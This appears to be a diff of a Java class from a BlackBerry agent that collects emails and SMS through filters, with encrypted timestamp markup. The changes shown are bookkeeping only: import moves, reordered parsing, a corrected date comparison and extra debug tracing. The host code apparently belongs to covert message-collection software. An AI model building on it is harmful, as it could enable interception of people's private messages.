@@ -21,13 +21,13 @@ import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.MailListener;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Keys;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.log.TimestampMarkup;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.log.Markup;
 import blackberry.utils.Check;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -111,16 +111,17 @@ public final class MessageAgent extends Agent {
      */
     protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
-        parse(confParams);
 
         // mantiene la data prima di controllare tutte le email
         markupDate = new TimestampMarkup(agentId, Keys.getInstance()
                 .getAesKey());
-        
+
         Date lastcheck = lastcheckGet("COLLECT");
         //#ifdef DEBUG_TRACE
-        debug.trace("MessageAgent lastcheck: "+lastcheck);
+        debug.trace("MessageAgent lastcheck: " + lastcheck);
         //#endif
+
+        parse(confParams);
 
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
@@ -257,21 +258,26 @@ public final class MessageAgent extends Agent {
                             if (filter.type == Filter.TYPE_COLLECT) {
                                 Date oldfrom = lastcheckGet("FilterFROM");
                                 Date oldto = lastcheckGet("FilterTO");
-                                
-                                if(filter.fromDate == oldfrom && filter.toDate == oldto){
-                                    //#ifdef DEBUG_TRACE
-                                    debug.trace("parse: same Mail Collect Filter");
+
+                                if (filter.fromDate.getTime() == oldfrom
+                                        .getTime()
+                                        && filter.toDate.getTime() == oldto
+                                                .getTime()) {
+                                    //#ifdef DEBUG_INFO
+                                    debug.info("same Mail Collect Filter");
                                     //#endif
-                                }else{
-                                  //#ifdef DEBUG_WARN
+                                } else {
+                                    //#ifdef DEBUG_WARN
                                     debug
                                             .warn("Changed collect filter, resetting markup");
+                                    debug.trace("oldfrom: " + oldfrom);
+                                    debug.trace("oldto: " + oldto);
                                     //#endif
                                     lastcheckReset();
                                     lastcheckSet("FilterFROM", filter.fromDate);
                                     lastcheckSet("FilterTO", filter.toDate);
                                 }
-                                
+
                             }
 
                             filtersEMAIL.put(filter.type, filter);
@@ -303,7 +309,7 @@ public final class MessageAgent extends Agent {
                     //#endif
                 } catch (final Exception e) {
                     //#ifdef DEBUG
-                    debug.error("Cannot filter" + e);
+                    debug.error("Cannot filter " + e);
                     //#endif
                 }
                 break;
@@ -337,33 +343,37 @@ public final class MessageAgent extends Agent {
 
         return tokens;
     }
-    
+
     public synchronized void lastcheckSet(String key, Date date) {
         //#ifdef DEBUG_TRACE
-        debug.trace("Writing markup: " +  key + " date: "+date);
+        debug.trace("Writing markup: " + key + " date: " + date);
         //#endif
-        
+
         markupDate.put(key, date);
     }
 
     public synchronized Date lastcheckGet(String key) {
+
+        //#ifdef DBC
+        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
+        //#endif
 
         Date date = markupDate.get(key);
 
         //#ifdef DEBUG_TRACE
         debug.trace("getLastCheck: " + key + " = " + date);
         //#endif
-        
+
         if (date == null) {
             return new Date(0);
-        }else{
+        } else {
             return date;
         }
-        
     }
 
     public synchronized void lastcheckReset() {
         markupDate.removeMarkup();
+
         //lastcheck = new Date(0); 
     }
 
